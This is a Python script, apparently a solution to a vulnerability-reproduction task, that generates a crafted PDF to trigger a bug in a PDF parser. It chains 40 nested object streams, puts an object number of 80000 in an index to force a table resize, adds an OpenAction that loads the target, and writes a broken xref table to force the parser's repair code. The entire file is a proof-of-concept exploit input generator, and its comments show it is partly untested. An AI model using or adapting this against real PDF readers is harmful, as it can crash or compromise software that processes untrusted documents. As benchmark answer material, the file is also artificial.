import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Configuration
        depth = 40
        start_id = 10
        trigger_ref = 80000
        target_obj_id = 5  # The object we try to load at the bottom
        
        # We need a chain:
        # Obj 10 contains Obj 11
        # ...
        # Obj 49 contains Obj 50
        # Obj 50 contains target_obj_id AND reference to trigger_ref in index
        
        # To make scanner find these, we use uncompressed streams
        # And physically embed "11 0 obj ... endobj" inside the stream of 10.
        
        # Build from inside out
        
        # Innermost: Obj 50
        # It contains target_obj_id.
        # It also has the high number in its index to trigger resize.
        
        # Definition of target_obj_id
        target_def = f"{target_obj_id} 0 obj\n(Target)\nendobj\n"
        
        # Index for Obj 50: "target_obj_id 0 trigger_ref 10"
        # Content: target_def + padding for trigger_ref?
        # Actually trigger_ref doesn't need to exist, just be in the index.
        # But wait, ObjStm parsing checks integrity?
        
        # Index:
        # target_obj_id (offset 0)
        # trigger_ref (offset X)
        
        stm_index_inner = f"{target_obj_id} 0 {trigger_ref} 100"
        first_offset_inner = len(stm_index_inner) + 1
        
        # Body of Obj 50
        body_inner = target_def
        
        # Obj 50 definition
        last_id = start_id + depth
        obj_def_inner = (
            f"{last_id} 0 obj\n"
            f"<< /Type /ObjStm /N 2 /First {first_offset_inner} >>\n"
            f"stream\n{stm_index_inner}\n{body_inner}\nendstream\nendobj\n"
        )
        
        current_data = obj_def_inner
        
        # Wrap upwards
        for i in range(depth - 1, -1, -1):
            obj_id = start_id + i
            child_id = obj_id + 1
            
            # This ObjStm (obj_id) contains child_id.
            # Index: "child_id 0"
            
            idx_str = f"{child_id} 0"
            first = len(idx_str) + 1
            
            # The body contains the DEFINITION of child_id
            body = current_data
            
            current_data = (
                f"{obj_id} 0 obj\n"
                f"<< /Type /ObjStm /N 1 /First {first} >>\n"
                f"stream\n{idx_str}\n{body}\nendstream\nendobj\n"
            )
            
        # current_data is now Obj 10, containing 11... containing 50... containing 5.
        
        # PDF parts
        header = b"%PDF-1.7\n"
        
        # Basic objects
        # Catalog -> Pages -> Page -> OpenAction (load target_obj_id)
        # Using OpenAction to force load
        objs = (
            b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>\nendobj\n"
            b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
            b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] >>\nendobj\n"
        )
        
        # The chain (Obj 10...)
        chain = current_data.encode('latin1')
        
        # Broken xref to force repair
        tail = b"\nxref\n0 1\n0000000000 65535 f \ntrailer\n<< /Size 10 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n"
        
        return header + objs + chain + tail